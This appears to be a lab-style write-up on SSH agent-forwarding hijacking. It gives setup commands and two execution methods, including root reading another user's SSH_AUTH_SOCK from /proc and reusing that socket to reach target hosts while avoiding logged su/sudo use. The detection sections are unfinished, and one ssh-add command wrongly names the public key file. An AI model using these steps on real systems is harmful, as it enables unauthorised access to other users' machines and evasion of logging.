# SSH Hijacking With SSH-Agent Forwarding
## Summary

SSH-Agent is a utility that keeps track of a user's private keys and allows them to be used without having to repeat their passphrases on every connection. SSH agent forwarding is a mechanism that allows a user to use the SSH-Agent on an intermediate server as if it were their own local agent on their originating machine. This is useful in situations where a user might need to ssh from an intermediate host into another network segment, which can't be directly accessed from the originating machine. It has the advantage of not requiring the private key to be stored on the intermediate server and the user does not need to enter their passphrase more than once.

SSH Hijacking is when you take control over the existing SSH session using the socket that gets created. In this scenario, the user will be logged into the intermediate server that's handling the SSH-Agent. Due to the intermediate server assuming the logged in user has already entered the passphrase(s) for the target computers, this technique allows an attacker to log in to every system that trusts the intermediate server without knowing the passphrase to the private key file.

## Prerequisites

A client, intermediate server, and at least one target must be used for this attack, each one requires SSH to be installed and must support SSH-Agent Forwarding. The client must be logged into the intermediate server and has entered the passphrase at least once, and must not close their connection to the server.

## Setup

In this setup, there will be three hosts; client, intermediate, and target. The intermediate host will house the SSH-Agent forwarding. The public key needs to be installed on both intermediate and target. The keys can be generated and uploaded with the following commands on the client:

```bash
ssh-keygen
ssh-copy-id -i /path/to/created/key.pub user@intermediate
ssh-copy-id -i /path/to/created/key.pub user@target
```

Next, SSH needs to be told to use a forwarded agent. Ensure the following is set in ~/.ssh/config:

```config
ForwardAgent yes
```

Activate the agent and add the generated keys with the following commands on the client, ssh-add will prompt for the passphrase for the key:

```bash
eval `ssh-agent`
ssh-add /path/to/created/key.pub
```

Now, on the intermediate server, the following must be set in /etc/ssh/sshd_config:

```config
AllowAgentForwarding yes
```

The client must log into the intermediate server, and keep this connection alive. The client must also enter the passphrase at least once so that SSH-Agent will remember the client being authenticated, so it will not prompt for the passphrase during execution.

## Execution
### Method 1 - Low Privileges

This method only works if the user you have compromised has an active SSH session to the intermediate server, if you can not authenticate as the user that does have the session, then you will need root privileges.

Since you are effectively the user you have compromised, simply running the following commands will allow you to gain access to any target system that's been configured for SSH-Agent Forwarding for this user:

```bash
ssh user@intermediate # On the client
ssh user@target # On the intermediate server
```

#### Indicators of Compromise

TODO

### Method 2 - Root Privileges

One way to perform this method is simply to use the su or sudo command to become that user, and then following method 1. However, to avoid running these commands as they do populate logs on Linux by default, this method will outline how to do it from root alone **FROM THE INTERMEDIATE SERVER**.

The first step is to find an active SSH session as any user on the box, and fetching the environment variables from all of it's children PID's. This can be done with the following commands:

```bash
ps aux | grep ssh  # Find the user who has an active session
pstree -p user | grep ssh # Find the list of PID's following that session
cat /proc/PID/environ | tr '\0' '\n' | grep "SSH"
```

If the output from the last command contains "SSH_AUTH_SOCK", then it's value will likely work for this method. It should contain a file path to a socket, to abuse this as root (or if the file permissions on the socket are insecure somehow) then the following commands can be used:

```bash
SSH_AUTH_SOCK=/tmp/ssh-randomstring/agent.number ssh-add -l
SSH_AUTH_SOCK=/tmp/ssh-randomstring/agent.number ssh user@target
```

#### Indicators of Compromise

TODO